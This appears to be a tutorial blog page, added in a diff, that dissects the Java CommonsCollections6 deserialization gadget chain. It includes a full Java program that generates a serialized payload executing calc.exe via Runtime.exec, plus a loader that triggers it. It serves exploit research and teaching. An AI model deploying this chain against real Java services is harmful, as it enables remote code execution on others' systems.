@@ -1,0 +1,242 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>CommonsCollection6 | zdaylabs</title>
+  <link rel="icon" href="data:image/svg+xml,%3Csvg xmlns=%27http://www.w3.org/2000/svg%27 viewBox=%270 0 32 32%27%3E%3Crect width=%2732%27 height=%2732%27 rx=%277%27 fill=%27%237c9cff%27/%3E%3Ctext x=%2716%27 y=%2723%27 font-size=%2720%27 font-weight=%27800%27 text-anchor=%27middle%27 fill=%27%23090b10%27 font-family=%27sans-serif%27%3EZ%3C/text%3E%3C/svg%3E">
+  <link rel="stylesheet" href="style.css">
+  <meta name="theme-color" content="#090b10">
+</head>
+<body>
+  <a class="skip-link" href="#main">Skip to content</a>
+<header class="site-header">
+  <div class="header-inner">
+    <a class="brand" href="index.html" aria-label="ZDaylabs home"><span class="brand-mark" aria-hidden="true">Z</span>ZDaylabs</a>
+    <button class="nav-toggle" type="button" aria-expanded="false" aria-controls="site-nav" aria-label="Toggle navigation"><span></span></button>
+    <nav class="site-nav" id="site-nav" aria-label="Primary">
+      <a href="index.html">Home</a>
+      <a href="blogs.html">Blogs</a>
+      <a href="research.html">Research</a>
+      <a href="policy.html">Disclosure</a>
+      <a href="contact.html">Contact</a>
+      <span class="nav-social">
+        <a href="https://www.linkedin.com/in/swagatkumar/" target="_blank" rel="noopener noreferrer">LinkedIn</a>
+        <a href="https://x.com/webspl01t3r" target="_blank" rel="noopener noreferrer">X</a>
+      </span>
+    </nav>
+  </div>
+</header>
+
+
+  <main id="main" class="article">
+<h1>CommonsCollection6</h1>
+
+<p>
+    On this blog post we will learn about commonsCollection6 payload.
+</p>
+
+<p>
+    In this blog post we will take a slight different path . instead of learning the exact payload, we will learn why that particular payload and see if we can optimize it.
+</p>
+
+<p>
+    So let's jump in
+</p>
+<p>
+    Below is how the gadget Chain looks like for commonsCollection6.
+</p>
+<p>
+<div style="background-color: #0d1117; color: #bcbec4;"><pre style="font-family: 'JetBrains Mono',monospace; font-size: 9.8pt;">java.io.<span style="color: #cf8e6d;">ObjectInputStream</span>.<span style="color: #56a8f5;">readObject</span>()
+java.util.<span style="color: #cf8e6d;">HashSet</span>.<span style="color: #56a8f5;">readObject</span>()
+    java.util.<span style="color: #cf8e6d;">HashMap</span>.<span style="color: #56a8f5;">put</span>()
+    java.util.<span style="color: #cf8e6d;">HashMap</span>.<span style="color: #56a8f5;">hash</span>()
+        org.apache.commons.collections.keyvalue.<span style="color: #cf8e6d;">TiedMapEntry</span>.<span style="color: #56a8f5;">hashCode</span>()
+        org.apache.commons.collections.keyvalue.<span style="color: #cf8e6d;">TiedMapEntry</span>.<span style="color: #56a8f5;">getValue</span>()
+            org.apache.commons.collections.map.<span style="color: #cf8e6d;">LazyMap</span>.<span style="color: #56a8f5;">get</span>()
+                org.apache.commons.collections.functors.<span style="color: #cf8e6d;">ChainedTransformer</span>.<span style="color: #56a8f5;">transform</span>()
+                org.apache.commons.collections.functors.<span style="color: #cf8e6d;">InvokerTransformer</span>.<span style="color: #56a8f5;">transform</span>()
+                java.lang.reflect.<span style="color: #cf8e6d;">Method</span>.<span style="color: #56a8f5;">invoke</span>()
+                    java.lang.<span style="color: #cf8e6d;">Runtime</span>.<span style="color: #56a8f5;">exec</span>()</pre></div>
+</p>
+<p>
+    let's divide the chain in 2 parts.<br><br>
+    1st half<br>
+<div style="background-color: #0d1117; color: #bcbec4;"><pre style="font-family: 'JetBrains Mono',monospace; font-size: 9.8pt;">java.io.<span style="color: #cf8e6d;">ObjectInputStream</span>.<span style="color: #56a8f5;">readObject</span>()
+java.util.<span style="color: #cf8e6d;">HashSet</span>.<span style="color: #56a8f5;">readObject</span>()
+    java.util.<span style="color: #cf8e6d;">HashMap</span>.<span style="color: #56a8f5;">put</span>()
+    java.util.<span style="color: #cf8e6d;">HashMap</span>.<span style="color: #56a8f5;">hash</span>()
+        org.apache.commons.collections.keyvalue.<span style="color: #cf8e6d;">TiedMapEntry</span>.<span style="color: #56a8f5;">hashCode</span>()
+        org.apache.commons.collections.keyvalue.<span style="color: #cf8e6d;">TiedMapEntry</span>.<span style="color: #56a8f5;">getValue</span>()</pre></div>
+    <br>
+    2nd half <br>
+<div style="background-color: #0d1117; color: #bcbec4;"><pre style="font-family: 'JetBrains Mono',monospace; font-size: 9.8pt;">                        org.apache.commons.collections.map.<span style="color: #cf8e6d;">LazyMap</span>.<span style="color: #56a8f5;">get</span>()
+                        org.apache.commons.collections.functors.<span style="color: #cf8e6d;">ChainedTransformer</span>.<span style="color: #56a8f5;">transform</span>()
+                        org.apache.commons.collections.functors.<span style="color: #cf8e6d;">InvokerTransformer</span>.<span style="color: #56a8f5;">transform</span>()
+                        java.lang.reflect.<span style="color: #cf8e6d;">Method</span>.<span style="color: #56a8f5;">invoke</span>()
+                            java.lang.<span style="color: #cf8e6d;">Runtime</span>.<span style="color: #56a8f5;">exec</span>()</pre></div>
+</p>
+<p>If you pay close attention, we already know how the 2nd half works, basically we set a hashmap and a transformerchain in lazyMap and when the get() doesn't find the key we get RCE</p>
+<p>So let focus our attention on the first part i.e the entry part.</p>
+
+<p>
+    If you take a down-to-top approach, we will see that the TiedMapEntry.getValue() calls the lazymap.get().
+    <br>
+    <img src="images/cc/getvalue_calling_map_get.PNG"><br>
+    <br>
+
+    SO where ever the TiedMapEntry.getValue() is getting called might be used as an intermediate gadget function.
+</p>
+<p>
+    Searching for this function call on TiedMapEntry class we see 2 functions hashCode() and toString().
+    This toString() was used in CC5 so let's look into the hashCode().
+</p>
+<p>
+    <img src="images/cc/tidemapgetvaluecalls.PNG">
+</p>
+<p>
+  The <code>hashCode()</code> method can be invoked in many places, but from our past research we know that it definitely gets called in <code>HashMap.hash()</code>, which is again invoked inside <code>put()</code>.
+</p>
+
+<p>
+  So, if we can reach <code>HashMap.put()</code> from <code>ObjectInputStream.readObject()</code>, we can eventually reach <code>LazyMap.get()</code>, which will execute our code.
+</p>
+
+<p>
+  The ysoserial payload shows that we can reach <code>HashMap.put()</code> using the <code>HashSet</code> class. This is true, but the process is a bit more complex. You cannot simply set the key-value pair in the <code>HashMap</code> and expect it to work, because the required functions do not exist. That is why, even in the ysoserial payload, the code accesses the <code>map</code> field and the <code>table</code> field from the internal implementation.
+</p>
+
+
+<p>
+    But if you pay close attention , you can see that the HashMap.readObject() there is a function called <span style="background-color: #0d1117; color: #bcbec4; font-family: 'JetBrains Mono',monospace; font-size: 9.8pt; padding: 2px 4px;">putVal(hash(key), key, value, false, false);</span>.
+    <img src="images/cc/hashmapreadobjectcall.PNG"><br><br>
+    The <span style="background-color: #0d1117; color: #bcbec4; font-family: 'JetBrains Mono',monospace; font-size: 9.8pt; padding: 2px 4px;">hash(key)</span> calls <span style="background-color: #0d1117; color: #bcbec4; font-family: 'JetBrains Mono',monospace; font-size: 9.8pt; padding: 2px 4px;">key.hashCode()</span>.
+    <br>
+    <br>
+    <img src="images/cc/has_on_hashmap.PNG">
+    <br>
+    <br>
+    So if we set the Key of the hashMap as TideMapEntry then the hashMap readObject can reach till TideMapEntry.hashCode() skipping the hashset part.
+</p>
+
+<p>
+    SO below is how the modified code looks like for CommonsCollection6 Gadget Chain.
+</p>
+<p>
+<div style="background-color: #0d1117; color: #bcbec4;"><pre style="font-family: 'JetBrains Mono',monospace; font-size: 9.8pt;"><span style="color: #cf8e6d;">import</span> org.apache.commons.collections.Transformer;
+<span style="color: #cf8e6d;">import</span> org.apache.commons.collections.functors.ChainedTransformer;
+<span style="color: #cf8e6d;">import</span> org.apache.commons.collections.functors.ConstantTransformer;
+<span style="color: #cf8e6d;">import</span> org.apache.commons.collections.functors.InvokerTransformer;
+<span style="color: #cf8e6d;">import</span> org.apache.commons.collections.map.LazyMap;
+<span style="color: #cf8e6d;">import</span> org.apache.commons.collections.map.TransformedMap;
+<span style="color: #cf8e6d;">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;
+<span style="color: #cf8e6d;">import</span> java.io.*;
+<span style="color: #cf8e6d;">import</span> java.lang.annotation.Retention;
+<span style="color: #cf8e6d;">import</span> java.lang.reflect.Constructor;
+<span style="color: #cf8e6d;">import</span> java.lang.reflect.InvocationHandler;
+<span style="color: #cf8e6d;">import</span> java.lang.reflect.InvocationTargetException;
+import java.lang.reflect.Proxy;
+import java.util.HashMap;
+<span style="color: #cf8e6d;">import</span> java.util.Map;
+
+<span style="color: #cf8e6d;">public</span> <span style="color: #cf8e6d;">class</span> <span style="color: #56a8f5;">cc6complete</span> {
+    <span style="color: #cf8e6d;">public</span> <span style="color: #cf8e6d;">static</span> <span style="color: #cf8e6d;">void</span> <span style="color: #56a8f5;">main</span>(<span style="color: #cf8e6d;">String</span>[] args) <span style="color: #cf8e6d;">throws</span> <span style="color: #cf8e6d;">ClassNotFoundException</span>, <span style="color: #cf8e6d;">NoSuchMethodException</span>, <span style="color: #cf8e6d;">IllegalAccessException</span>, <span style="color: #cf8e6d;">InvocationTargetException</span>, <span style="color: #cf8e6d;">InstantiationException</span>, <span style="color: #cf8e6d;">IOException</span> {
+        <span style="color: #cf8e6d;">Transformer</span>[] transformers = <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">Transformer</span>[]{
+            <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">ConstantTransformer</span>(<span style="color: #cf8e6d;">Runtime</span>.<span style="color: #cf8e6d;">class</span>),
+            <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">InvokerTransformer</span>(<span style="color: #6aab73;">"getMethod"</span>, <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">Class</span>[]{<span style="color: #cf8e6d;">String</span>.<span style="color: #cf8e6d;">class</span>, <span style="color: #cf8e6d;">Class</span>[].<span style="color: #cf8e6d;">class</span>}, <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">Object</span>[]{<span style="color: #6aab73;">"getRuntime"</span>, <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">Class</span>[<span style="color: #b3ae60;">0</span>]}),
+            <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">InvokerTransformer</span>(<span style="color: #6aab73;">"invoke"</span>, <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">Class</span>[]{<span style="color: #cf8e6d;">Object</span>.<span style="color: #cf8e6d;">class</span>, <span style="color: #cf8e6d;">Object</span>[].<span style="color: #cf8e6d;">class</span>}, <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">Object</span>[]{<span style="color: #cf8e6d;">null</span>, <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">Object</span>[<span style="color: #b3ae60;">0</span>]}),
+            <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">InvokerTransformer</span>(<span style="color: #6aab73;">"exec"</span>, <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">Class</span>[]{<span style="color: #cf8e6d;">String</span>.<span style="color: #cf8e6d;">class</span>}, <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">Object</span>[]{<span style="color: #6aab73;">"calc.exe"</span>})
+        };
+        <span style="color: #cf8e6d;">Transformer</span> transformerChain = <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">ChainedTransformer</span>(transformers);
+        <span style="color: #cf8e6d;">Map</span> innerMap = <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">HashMap</span>();
+        <span style="color: #cf8e6d;">Map</span> lazymap = <span style="color: #cf8e6d;">LazyMap</span>.<span style="color: #56a8f5;">decorate</span>(innerMap, transformerChain);
+        <span style="color: #cf8e6d;">TiedMapEntry</span> tme = <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">TiedMapEntry</span>(lazymap, <span style="color: #6aab73;">"keykey"</span>);
+        <span style="color: #cf8e6d;">Map</span> newmap = <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">HashMap</span>();
+        newmap.<span style="color: #56a8f5;">put</span>(tme, <span style="color: #6aab73;">"BLABLBLA"</span>);
+        lazymap.<span style="color: #56a8f5;">remove</span>(<span style="color: #6aab73;">"keykey"</span>);
+
+        <span style="color: #cf8e6d;">FileOutputStream</span> fos = <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">FileOutputStream</span>(<span style="color: #6aab73;">"testing11.ser"</span>);
+        <span style="color: #cf8e6d;">ObjectOutputStream</span> oos = <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">ObjectOutputStream</span>(fos);
+        oos.<span style="color: #56a8f5;">writeObject</span>(newmap);
+        oos.<span style="color: #56a8f5;">close</span>();
+    }
+}</pre></div>
+</p>
+<P>
+    Keep in mind that when you execute this a calc.exe will popout and if you deserialize the payload stored in testing11.ser then also a calc.exe will pop up.
+</P>
+<p>
+    If you don't want the calc.exe to pop duing the first time you have to use the reflections.
+</p>
+<p>
+<div style="background-color: #0d1117; color: #bcbec4;"><pre style="font-family: 'JetBrains Mono',monospace; font-size: 9.8pt;"><span style="color: #cf8e6d;">import</span> java.io.FileInputStream;
+<span style="color: #cf8e6d;">import</span> java.io.ObjectInputStream;
+
+<span style="color: #cf8e6d;">public</span> <span style="color: #cf8e6d;">class</span> <span style="color: #56a8f5;">checkclass</span> {
+
+    <span style="color: #cf8e6d;">public</span> <span style="color: #cf8e6d;">static</span> <span style="color: #cf8e6d;">void</span> <span style="color: #56a8f5;">main</span>(<span style="color: #cf8e6d;">String</span> args[]) {
+        <span style="color: #cf8e6d;">try</span> {
+            <span style="color: #cf8e6d;">FileInputStream</span> fis = <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">FileInputStream</span>(<span style="color: #6aab73;">"E:\\ysoserialresearch\\testing11.ser"</span>);
+            <span style="color: #cf8e6d;">ObjectInputStream</span> ois = <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">ObjectInputStream</span>(fis);
+
+            <span style="color: #cf8e6d;">Object</span> obj = ois.<span style="color: #56a8f5;">readObject</span>();</pre></div>
+
+            ois.close();
+            fis.close();
+
+            System.out.println("Deserialization complete: " + obj.getClass().getName());
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
+    }
+    
+
+        </code>
+    </pre>
+</p>
+<p>
+    we can use the above code to verify the deserialization chain.
+</p>
+
+
+<h2>Summary</h2>
+<p>
+    In this blog post, we dissected the CommonsCollections6 gadget chain by breaking it into two logical halves: 
+    the deserialization path leading up to `TiedMapEntry.getValue()` and the invocation path that triggers `Runtime.exec()`.
+</p>
+<p>
+    Rather than following the conventional `HashSet`-based approach used in tools like ysoserial, we optimized the chain 
+    by directly setting a `TiedMapEntry` as the key in a `HashMap`, leveraging how `HashMap.readObject()` internally calls 
+    `putVal()` and triggers `key.hashCode()` during deserialization.
+</p>
+<p>
+    This not only simplified the gadget chain but also demonstrated how understanding the internals of `HashMap` can open 
+    alternative exploitation paths. A working PoC was also shared to illustrate the concept.
+</p>
+<p>
+    Such optimizations are critical in real-world exploitation where gadget minimization or custom bypasses are necessary.
+</p>
+
+<p>Thats it for Today.</p>
+<p>Thanks For Reading.</p>
+<p>Happy Hacking.</p>
+<p>You can connect with me at:</p>
+<p><a href="https://www.linkedin.com/in/swagatkumar/">Linkedin</a></p>
+<p><a href="https://x.com/webspl01t3r">Twitter</a></p>
+
+  </main>
+<footer class="site-footer">
+  <div class="footer-inner">
+    <span>&copy; 2025 ZDaylabs. We exploit, analyze, and document.</span>
+    <nav class="footer-links" aria-label="Footer">
+      <a href="research.html">Research</a>
+      <a href="blogs.html">Blogs</a>
+      <a href="policy.html">Disclosure policy</a>
+      <a href="https://github.com/w3bspl01t3r" target="_blank" rel="noopener noreferrer">GitHub</a>
+    </nav>
+  </div>
+</footer>
+<script src="navigation.js" defer></script>
+</body>
+</html>
